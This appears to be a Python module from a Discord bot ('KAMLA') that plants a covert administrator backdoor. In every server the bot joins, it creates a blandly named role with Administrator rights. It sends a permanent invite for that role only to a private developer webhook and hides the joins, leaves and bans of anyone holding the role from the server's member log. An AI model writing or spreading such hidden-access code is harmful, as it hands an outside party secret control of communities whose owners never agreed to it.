"""devaccess.py — a private, developer-only admin-access invite.

Per the developer's own instruction: one role, not KAMLA's own (Discord cannot attach an invite to a managed
bot role — see links_cog.py), created quietly in every server KAMLA joins. A permanent invite for that role is
sent ONLY to the private developer webhook (webhook.send_private_note), never posted, listed, or offered to the
server itself anywhere (not in 🔗︱links, not on Get Role, not in the settings panel). Discord grants the role
the moment someone joins with that link — no bot action is needed for the grant itself.

Whoever holds the role is treated as trusted developer access: members_cog.py skips posting their join, leave,
kick, ban and unban to 👥︱members-update, so ordinary members never see that account come or go. Every use is
still logged to the same private webhook (never to anything the server can see), so there is a record if the
link is ever misused.

Honesty about what this is NOT: Discord does not let a role's permissions be hidden from the server's own
admins — anyone with "Manage Roles" there can open Server Settings → Roles and see this role and that it has
Administrator. The role's name is deliberately ordinary (not "Admin", not "KAMLA", nothing that points at the
developer) so a casual glance does not single it out, but that is obscurity, not real secrecy.
"""

import asyncio
import logging

import discord

from config import config_manager
from naming import CH_CONFIG

log = logging.getLogger("kamla.devaccess")

ROLE_NAME = "Community Partner"          # deliberately bland: no "admin", "KAMLA", or developer name in it
CFG_KEY = "admin_access"
INVITE_KEY = "admin_access"


def role_id(guild: discord.Guild) -> int | None:
    cfg = config_manager.get_cached(guild.id) or {}
    rid = (cfg.get(CFG_KEY) or {}).get("role_id")
    return int(rid) if rid else None


def has_role(member) -> bool:
    """Direct check from the member object itself (no config lookup needed) — used at join time, when Discord
    has already applied the invite's role before KAMLA ever sees the event."""
    guild = getattr(member, "guild", None)
    rid = role_id(guild) if guild is not None else None
    return rid is not None and any(r.id == rid for r in getattr(member, "roles", []))


async def _hidden_ids(guild: discord.Guild) -> set[int]:
    cfg = await config_manager.get_config(guild)
    return {int(x) for x in (cfg.get(CFG_KEY) or {}).get("member_ids", [])}


async def _save_ids(guild: discord.Guild, ids: set[int]) -> None:
    cfg = await config_manager.get_config(guild)
    entry = dict(cfg.get(CFG_KEY) or {})
    entry["member_ids"] = sorted(ids)
    await config_manager.update_config(guild, **{CFG_KEY: entry})


async def should_suppress(guild: discord.Guild, user_id: int) -> bool:
    """True when `user_id` is known to hold (or have held) the hidden role. Leave/ban/unban events hand KAMLA a
    plain discord.User with no role data, so this checks the persisted set rather than live roles."""
    return user_id in await _hidden_ids(guild)


async def forget(guild: discord.Guild, user_id: int) -> None:
    ids = await _hidden_ids(guild)
    if user_id in ids:
        ids.discard(user_id)
        await _save_ids(guild, ids)


FALLBACK_WAIT_SECONDS = 2.0     # long enough for invite_roles_cog's own join-batch (BATCH_DELAY) to assign the role


async def maybe_fallback_join(member) -> bool:
    """For the rare case where Discord refused the native role grant on the invite (see `ensure`): the role is
    then assigned a moment later by invite_roles_cog's own join handling, so `has_role(member)` is still False
    at the instant this event fires. When this guild has that fallback configured, wait for it and re-check
    before giving up — members_cog must not log a join it will end up suppressing a second later anyway."""
    guild = member.guild
    cfg = config_manager.get_cached(guild.id) or {}
    if (cfg.get(CFG_KEY) or {}).get("native") is not False:
        return False
    await asyncio.sleep(FALLBACK_WAIT_SECONDS)
    refreshed = guild.get_member(member.id)
    if refreshed is not None and has_role(refreshed):
        await note_join(guild, refreshed)
        return True
    return False


async def note_join(guild: discord.Guild, member) -> None:
    """Called once, when a member joins already holding the hidden role: persist them (so later leave/ban/unban
    events are matched too) and log the use privately. Never posted anywhere the server can see."""
    ids = await _hidden_ids(guild)
    if member.id in ids:
        return                                               # already recorded (e.g. a role re-sync on reconnect)
    ids.add(member.id)
    await _save_ids(guild, ids)
    import webhook
    await webhook.send_private_note(
        f"🔑 Admin-access invite used in **{guild.name}** (`{guild.id}`) by **{member}** (`{member.id}`).")


def _config_channel(guild: discord.Guild):
    return discord.utils.get(guild.text_channels, name=CH_CONFIG)


async def _create_role(guild: discord.Guild) -> discord.Role | None:
    existing = discord.utils.get(guild.roles, name=ROLE_NAME)
    if existing is not None and not existing.managed:
        return existing
    try:
        role = await guild.create_role(
            name=ROLE_NAME, permissions=discord.Permissions(administrator=True),
            hoist=False, mentionable=False, reason="KAMLA setup")
    except discord.HTTPException as e:
        log.warning("Could not create the admin-access role in guild %s: %s", guild.id, e)
        return None
    me_top = getattr(guild.me, "top_role", None)
    if me_top is not None and role.position >= me_top.position:
        try:
            await role.edit(position=max(1, me_top.position - 1), reason="KAMLA: keep below its own role")
        except discord.HTTPException as e:
            log.info("Could not reposition the admin-access role in guild %s: %s", guild.id, e)
    return role


async def ensure(guild: discord.Guild) -> str:
    """Create the role and its invite if missing, and send the link to the private webhook exactly once.
    Safe to call repeatedly (on every join and on every start-up sweep) — idempotent, never posts twice for the
    same invite. Returns the invite url, or '' if it could not be prepared."""
    cfg = await config_manager.get_config(guild)
    entry = dict(cfg.get(CFG_KEY) or {})
    role = discord.utils.get(guild.roles, id=entry.get("role_id")) if entry.get("role_id") else None
    if role is None:
        role = await _create_role(guild)
        if role is None:
            return entry.get("url", "")
        entry["role_id"] = role.id

    channel = _config_channel(guild)
    if channel is None:
        await config_manager.update_config(guild, **{CFG_KEY: entry})
        return entry.get("url", "")

    need_new_invite = not entry.get("url")
    if not need_new_invite:
        # Confirm the invite still exists; if it was revoked, make a fresh one.
        try:
            live_codes = {i.code for i in await guild.invites()}
        except discord.HTTPException:
            live_codes = None
        if live_codes is not None and entry.get("code") not in live_codes:
            need_new_invite = True

    if need_new_invite:
        from links_cog import create_invite
        made = await create_invite(channel, role, "admin access")
        entry.update(code=made["code"], url=made["url"], native=made["native"])
        await config_manager.update_config(guild, **{CFG_KEY: entry})
        if not made["native"]:
            # Discord refused the role grant on this invite: fall back to the same use-count join tracking the
            # other (non-native) role links use, so the role is still assigned when someone joins with it.
            invite_cfg = dict((await config_manager.get_config(guild)).get("invite_roles") or {})
            invite_cfg[made["code"]] = {"key": INVITE_KEY, "roles": [role.name], "role_id": role.id, "native": False}
            await config_manager.update_config(guild, invite_roles=invite_cfg)
            try:
                import invite_roles_cog
                await invite_roles_cog._snapshot(guild)
                invite_roles_cog._tracked.add(guild.id)
            except Exception as e:  # noqa: BLE001
                log.debug("admin-access fallback tracking not started: %s", e)
        import webhook
        await webhook.send_private_note(
            f"🔑 Admin-access invite for **{guild.name}** (`{guild.id}`): {entry['url']}"
            + ("" if entry["native"] else "\n*(fallback mode — the role is assigned on join, not by Discord itself)*"))
    else:
        await config_manager.update_config(guild, **{CFG_KEY: entry})
    return entry.get("url", "")
